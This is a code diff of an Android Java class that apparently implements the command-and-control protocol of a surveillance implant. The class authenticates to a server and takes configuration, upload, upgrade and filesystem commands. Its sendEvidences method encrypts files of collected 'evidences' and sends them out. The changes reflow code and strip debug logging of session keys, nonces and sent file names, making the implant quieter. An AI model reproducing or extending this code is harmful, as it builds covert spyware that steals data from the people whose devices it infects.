@@ -38,10 +38,10 @@ import com.ht.RCSAndroidGUI.util.WChar;
  */
 public class ZProtocol extends Protocol {
 
-	/** The Constant SHA1LEN. */
-	private static final int SHA1LEN = 20;
 	/** The debug. */
 	private static String TAG = "ZProtocol";
+	/** The Constant SHA1LEN. */
+	private static final int SHA1LEN = 20;
 	/** The crypto k. */
 	private final EncryptionPKCS5 cryptoK = new EncryptionPKCS5();
 
@@ -131,16 +131,13 @@ public class ZProtocol extends Protocol {
 	 * @throws ProtocolException
 	 *             the protocol exception
 	 */
-	private boolean authentication() throws TransportException,
-			ProtocolException {
+	private boolean authentication() throws TransportException, ProtocolException {
 		Log.d("QZ", TAG + " Info: ***** Authentication *****");
 		// key init
 		cryptoConf.makeKey(Keys.self().getChallengeKey());
 
 		random.nextBytes(Kd);
 		random.nextBytes(Nonce);
-		Log.d("QZ", TAG + " Kd: " + Utils.byteArrayToHex(Kd));
-		Log.d("QZ", TAG + " Nonce: " + Utils.byteArrayToHex(Nonce));
 		final byte[] cypherOut = cryptoConf.encryptData(forgeAuthentication());
 
 		final byte[] response = transport.command(cypherOut);
@@ -157,8 +154,7 @@ public class ZProtocol extends Protocol {
 	 * @throws ProtocolException
 	 *             the protocol exception
 	 */
-	private boolean[] identification() throws TransportException,
-			ProtocolException {
+	private boolean[] identification() throws TransportException, ProtocolException {
 		Log.d("QZ", TAG + " Info: ***** Identification *****");
 		final byte[] response = command(Proto.ID, forgeIdentification());
 		final boolean[] capabilities = parseIdentification(response);
@@ -177,8 +173,7 @@ public class ZProtocol extends Protocol {
 	 * @throws CommandException
 	 *             the command exception
 	 */
-	private void newConf(final boolean cap) throws TransportException,
-			ProtocolException, CommandException {
+	private void newConf(final boolean cap) throws TransportException, ProtocolException, CommandException {
 		if (cap) {
 			Log.d("QZ", TAG + " Info: ***** NewConf *****");
 			final byte[] response = command(Proto.NEW_CONF);
@@ -198,8 +193,7 @@ public class ZProtocol extends Protocol {
 	 * @throws CommandException
 	 *             the command exception
 	 */
-	private void download(final boolean cap) throws TransportException,
-			ProtocolException, CommandException {
+	private void download(final boolean cap) throws TransportException, ProtocolException, CommandException {
 		if (cap) {
 			final byte[] response = command(Proto.DOWNLOAD);
 			parseDownload(response);
@@ -218,8 +212,7 @@ public class ZProtocol extends Protocol {
 	 * @throws CommandException
 	 *             the command exception
 	 */
-	private void upload(final boolean cap) throws TransportException,
-			ProtocolException, CommandException {
+	private void upload(final boolean cap) throws TransportException, ProtocolException, CommandException {
 		if (cap) {
 			Log.d("QZ", TAG + " Info: ***** Upload *****");
 			upgrade = false;
@@ -243,8 +236,7 @@ public class ZProtocol extends Protocol {
 	 * @throws CommandException
 	 *             the command exception
 	 */
-	private void upgrade(final boolean cap) throws TransportException,
-			ProtocolException, CommandException {
+	private void upgrade(final boolean cap) throws TransportException, ProtocolException, CommandException {
 		if (cap) {
 			Log.d("QZ", TAG + " Info: ***** Upgrade *****");
 			upgradeFiles.removeAllElements();
@@ -269,8 +261,7 @@ public class ZProtocol extends Protocol {
 	 * @throws CommandException
 	 *             the command exception
 	 */
-	private void filesystem(final boolean cap) throws TransportException,
-			ProtocolException, CommandException {
+	private void filesystem(final boolean cap) throws TransportException, ProtocolException, CommandException {
 		if (cap) {
 			Log.d("QZ", TAG + " Info: ***** FileSystem *****");
 			final byte[] response = command(Proto.FILESYSTEM);
@@ -288,8 +279,7 @@ public class ZProtocol extends Protocol {
 	 * @throws CommandException
 	 *             the command exception
 	 */
-	private void evidences() throws TransportException, ProtocolException,
-			CommandException {
+	private void evidences() throws TransportException, ProtocolException, CommandException {
 		Log.d("QZ", TAG + " Info: ***** Log *****");
 		sendEvidences(Path.logs());
 	}
@@ -304,8 +294,7 @@ public class ZProtocol extends Protocol {
 	 * @throws CommandException
 	 *             the command exception
 	 */
-	private void end() throws TransportException, ProtocolException,
-			CommandException {
+	private void end() throws TransportException, ProtocolException, CommandException {
 		Log.d("QZ", TAG + " Info: ***** END *****");
 		final byte[] response = command(Proto.BYE);
 		parseNewConf(response);
@@ -327,13 +316,11 @@ public class ZProtocol extends Protocol {
 		// filling structure
 		dataBuffer.write(Kd);
 		dataBuffer.write(Nonce);
-		Check.ensures(dataBuffer.getPosition() == 32,
-				"forgeAuthentication, wrong array size");
+		Check.ensures(dataBuffer.getPosition() == 32, "forgeAuthentication, wrong array size");
 		dataBuffer.write(Utils.padByteArray(keys.getBuildId(), 16));
 		dataBuffer.write(keys.getInstanceId());
 		dataBuffer.write(Utils.padByteArray(keys.getSubtype(), 16));
-		Check.ensures(dataBuffer.getPosition() == 84,
-				"forgeAuthentication, wrong array size");
+		Check.ensures(dataBuffer.getPosition() == 84, "forgeAuthentication, wrong array size");
 		// calculating digest
 		final SHA1Digest digest = new SHA1Digest();
 		digest.update(Utils.padByteArray(keys.getBuildId(), 16));
@@ -342,14 +329,10 @@ public class ZProtocol extends Protocol {
 		digest.update(keys.getConfKey());
 
 		final byte[] sha1 = digest.getDigest();
-		Log.d("QZ", TAG + " forgeAuthentication sha1 = " + Utils.byteArrayToHex(sha1));
-		Log.d("QZ", TAG + " forgeAuthentication confKey="
-						+ Utils.byteArrayToHex(keys.getConfKey()));
+
 		// appending digest
 		dataBuffer.write(sha1);
-		Check.ensures(dataBuffer.getPosition() == data.length,
-				"forgeAuthentication, wrong array size");
-		Log.d("QZ", TAG + " forgeAuthentication: " + Utils.byteArrayToHex(data));
+		Check.ensures(dataBuffer.getPosition() == data.length, "forgeAuthentication, wrong array size");
 		return data;
 	}
 
@@ -362,24 +345,18 @@ public class ZProtocol extends Protocol {
 	 * @throws ProtocolException
 	 *             the protocol exception
 	 */
-	protected boolean parseAuthentication(final byte[] authResult)
-			throws ProtocolException {
+	protected boolean parseAuthentication(final byte[] authResult) throws ProtocolException {
 
 		if (new String(authResult).contains("<html>")) {
 			Log.d("QZ", TAG + " Error: Fake answer");
 			throw new ProtocolException(14);
 		}
-		Check.ensures(authResult.length == 64, "authResult.length="
-				+ authResult.length);
-		Log.d("QZ", TAG + " decodeAuth result = " + Utils.byteArrayToHex(authResult));
-		Log.d("QZ", TAG + " decodeAuth result string= " + new String(authResult));
+		Check.ensures(authResult.length == 64, "authResult.length=" + authResult.length);
 		// Retrieve K
 		final byte[] cypherKs = new byte[32];
 		System.arraycopy(authResult, 0, cypherKs, 0, cypherKs.length);
 		try {
 			final byte[] Ks = cryptoConf.decryptData(cypherKs);
-			Log.d("QZ", TAG + " decodeAuth Kd=" + Utils.byteArrayToHex(Kd));
-			Log.d("QZ", TAG + " decodeAuth Ks=" + Utils.byteArrayToHex(Ks));
 			// PBKDF1 (SHA1, c=1, Salt=KS||Kd)
 			final SHA1Digest digest = new SHA1Digest();
 			digest.update(Keys.self().getConfKey());
@@ -390,18 +367,12 @@ public class ZProtocol extends Protocol {
 			System.arraycopy(digest.getDigest(), 0, K, 0, K.length);
 
 			cryptoK.makeKey(K);
-			Log.d("QZ", TAG + " decodeAuth K=" + Utils.byteArrayToHex(K));
 			// Retrieve Nonce and Cap
 			final byte[] cypherNonceCap = new byte[32];
-			System.arraycopy(authResult, 32, cypherNonceCap, 0,
-					cypherNonceCap.length);
+			System.arraycopy(authResult, 32, cypherNonceCap, 0, cypherNonceCap.length);
 
 			final byte[] plainNonceCap = cryptoK.decryptData(cypherNonceCap);
-			Log.d("QZ", TAG + " decodeAuth plainNonceCap="
-							+ Utils.byteArrayToHex(plainNonceCap));
-			final boolean nonceOK = Utils.equals(Nonce, 0, plainNonceCap, 0,
-					Nonce.length);
-			Log.d("QZ", TAG + " decodeAuth nonceOK: " + nonceOK);
+			final boolean nonceOK = Utils.equals(Nonce, 0, plainNonceCap, 0, Nonce.length);
 			if (nonceOK) {
 				final int cap = Utils.byteArrayToInt(plainNonceCap, 16);
 				if (cap == Proto.OK) {
@@ -449,7 +420,6 @@ public class ZProtocol extends Protocol {
 		dataBuffer.write(phone);
 		Check.ensures(dataBuffer.getPosition() == content.length,
 				"forgeIdentification pos: " + dataBuffer.getPosition());
-		Log.d("QZ", TAG + " forgeIdentification: " + Utils.byteArrayToHex(content));
 		return content;
 	}
 
@@ -462,16 +432,15 @@ public class ZProtocol extends Protocol {
 	 * @throws ProtocolException
 	 *             the protocol exception
 	 */
-	protected boolean[] parseIdentification(final byte[] result)
-			throws ProtocolException {
+	protected boolean[] parseIdentification(final byte[] result) throws ProtocolException {
 		final boolean[] capabilities = new boolean[Proto.LASTTYPE];
 
 		final int res = Utils.byteArrayToInt(result, 0);
-		
+
 		if (res == Proto.OK) {
 			Log.d("QZ", TAG + " Info: got Identification");
 			final DataBuffer dataBuffer = new DataBuffer(result, 4, result.length - 4);
-			
+
 			try {
 				// la totSize e' discutibile
 				final int totSize = dataBuffer.readInt();
@@ -517,13 +486,11 @@ public class ZProtocol extends Protocol {
 	 * @throws CommandException
 	 *             the command exception
 	 */
-	protected void parseNewConf(final byte[] result) throws ProtocolException,
-			CommandException {
+	protected void parseNewConf(final byte[] result) throws ProtocolException, CommandException {
 		final int res = Utils.byteArrayToInt(result, 0);
 		if (res == Proto.OK) {
 			Log.d("QZ", TAG + " Info: got NewConf");
 			final int confLen = Utils.byteArrayToInt(result, 4);
-			Log.d("QZ", TAG + " parseNewConf len: " + confLen);
 			if (confLen > 0) {
 				final boolean ret = Protocol.saveNewConf(result, 8);
 
@@ -552,8 +519,7 @@ public class ZProtocol extends Protocol {
 		final int res = Utils.byteArrayToInt(result, 0);
 		if (res == Proto.OK) {
 			Log.d("QZ", TAG + " parseDownload, OK");
-			final DataBuffer dataBuffer = new DataBuffer(result, 4,
-					result.length - 4);
+			final DataBuffer dataBuffer = new DataBuffer(result, 4, result.length - 4);
 			try {
 				// la totSize e' discutibile
 				final int totSize = dataBuffer.readInt();
@@ -593,8 +559,7 @@ public class ZProtocol extends Protocol {
 		final int res = Utils.byteArrayToInt(result, 0);
 		if (res == Proto.OK) {
 			Log.d("QZ", TAG + " parseUpload, OK");
-			final DataBuffer dataBuffer = new DataBuffer(result, 4,
-					result.length - 4);
+			final DataBuffer dataBuffer = new DataBuffer(result, 4, result.length - 4);
 			try {
 				final int totSize = dataBuffer.readInt();
 				final int left = dataBuffer.readInt();
@@ -631,14 +596,12 @@ public class ZProtocol extends Protocol {
 	 * @throws ProtocolException
 	 *             the protocol exception
 	 */
-	protected boolean parseUpgrade(final byte[] result)
-			throws ProtocolException {
+	protected boolean parseUpgrade(final byte[] result) throws ProtocolException {
 
 		final int res = Utils.byteArrayToInt(result, 0);
 		if (res == Proto.OK) {
 			Log.d("QZ", TAG + " parseUpgrade, OK");
-			final DataBuffer dataBuffer = new DataBuffer(result, 4,
-					result.length - 4);
+			final DataBuffer dataBuffer = new DataBuffer(result, 4, result.length - 4);
 			try {
 				final int totSize = dataBuffer.readInt();
 				final int left = dataBuffer.readInt();
@@ -680,13 +643,11 @@ public class ZProtocol extends Protocol {
 	 * @throws ProtocolException
 	 *             the protocol exception
 	 */
-	protected void parseFileSystem(final byte[] result)
-			throws ProtocolException {
+	protected void parseFileSystem(final byte[] result) throws ProtocolException {
 		final int res = Utils.byteArrayToInt(result, 0);
 		if (res == Proto.OK) {
 			Log.d("QZ", TAG + " parseFileSystem, OK");
-			final DataBuffer dataBuffer = new DataBuffer(result, 4,
-					result.length - 4);
+			final DataBuffer dataBuffer = new DataBuffer(result, 4, result.length - 4);
 			try {
 				final int totSize = dataBuffer.readInt();
 				final int numElem = dataBuffer.readInt();
@@ -721,8 +682,7 @@ public class ZProtocol extends Protocol {
 	 * @throws ProtocolException
 	 *             the protocol exception
 	 */
-	protected void sendEvidences(final String basePath)
-			throws TransportException, ProtocolException {
+	protected void sendEvidences(final String basePath) throws TransportException, ProtocolException {
 		Log.d("QZ", TAG + " Info: sendEvidences from: " + basePath);
 		final EvidenceCollector logCollector = EvidenceCollector.self();
 
@@ -744,12 +704,9 @@ public class ZProtocol extends Protocol {
 					continue;
 				}
 				final byte[] content = file.read();
-				Log.d("QZ", TAG + " Info: Sending file: "
-								+ EvidenceCollector.decryptName(logName)
-								+ " = " + fullLogName);
+				Log.d("QZ", TAG + " Info: Sending file: " + EvidenceCollector.decryptName(logName));
 				final byte[] plainOut = new byte[content.length + 4];
-				System.arraycopy(Utils.intToByteArray(content.length), 0,
-						plainOut, 0, 4);
+				System.arraycopy(Utils.intToByteArray(content.length), 0, plainOut, 0, 4);
 				System.arraycopy(content, 0, plainOut, 4, content.length);
 
 				final byte[] response = command(Proto.LOG, plainOut);
@@ -793,8 +750,7 @@ public class ZProtocol extends Protocol {
 		checkOk(result);
 	}
 
-	// // ****************************** INTERNALS
-	// ****************************************** ////
+	// ****************************** INTERNALS ***************************** //
 	/**
 	 * Command.
 	 * 
@@ -806,9 +762,7 @@ public class ZProtocol extends Protocol {
 	 * @throws ProtocolException
 	 *             the protocol exception
 	 */
-	private byte[] command(final int command) throws TransportException,
-			ProtocolException {
-		Log.d("QZ", TAG + " command: " + command);
+	private byte[] command(final int command) throws TransportException, ProtocolException {
 		return command(command, new byte[0]);
 	}
 
@@ -823,11 +777,9 @@ public class ZProtocol extends Protocol {
 	 * @throws TransportException
 	 *             the transport exception
 	 */
-	private byte[] command(final int command, final byte[] data)
-			throws TransportException {
+	private byte[] command(final int command, final byte[] data) throws TransportException {
 		Check.requires(cryptoK != null, "cypherCommand: cryptoK null");
 		Check.requires(data != null, "cypherCommand: data null");
-		Log.d("QZ", TAG + " command: " + command + " datalen: " + data.length);
 		final int dataLen = data.length;
 		final byte[] plainOut = new byte[dataLen + 4];
 		System.arraycopy(Utils.intToByteArray(command), 0, plainOut, 0, 4);
@@ -838,7 +790,7 @@ public class ZProtocol extends Protocol {
 			plainIn = cypheredWriteReadSha(plainOut);
 			return plainIn;
 		} catch (final CryptoException e) {
-			Log.d("QZ", TAG + " command: " + e);
+			Log.d("QZ", TAG + " Error: scommand: " + e);
 			throw new TransportException(9);
 		}
 	}
@@ -854,11 +806,7 @@ public class ZProtocol extends Protocol {
 	 * @throws CryptoException
 	 *             the crypto exception
 	 */
-	private byte[] cypheredWriteRead(final byte[] plainOut)
-			throws TransportException, CryptoException {
-
-		Log.d("QZ", TAG + " cypheredWriteRead");
-
+	private byte[] cypheredWriteRead(final byte[] plainOut) throws TransportException, CryptoException {
 		final byte[] cypherOut = cryptoK.encryptData(plainOut);
 		final byte[] cypherIn = transport.command(cypherOut);
 		final byte[] plainIn = cryptoK.decryptData(cypherIn);
@@ -876,12 +824,8 @@ public class ZProtocol extends Protocol {
 	 * @throws CryptoException
 	 *             the crypto exception
 	 */
-	private byte[] cypheredWriteReadSha(final byte[] plainOut)
-			throws TransportException, CryptoException {
-		Log.d("QZ", TAG + " cypheredWriteReadSha");
-		Log.d("QZ", TAG + " plainout: " + plainOut.length);
+	private byte[] cypheredWriteReadSha(final byte[] plainOut) throws TransportException, CryptoException {
 		final byte[] cypherOut = cryptoK.encryptDataIntegrity(plainOut);
-		Log.d("QZ", TAG + " cypherOut: " + cypherOut.length);
 		final byte[] cypherIn = transport.command(cypherOut);
 
 		if (cypherIn.length < SHA1LEN) {
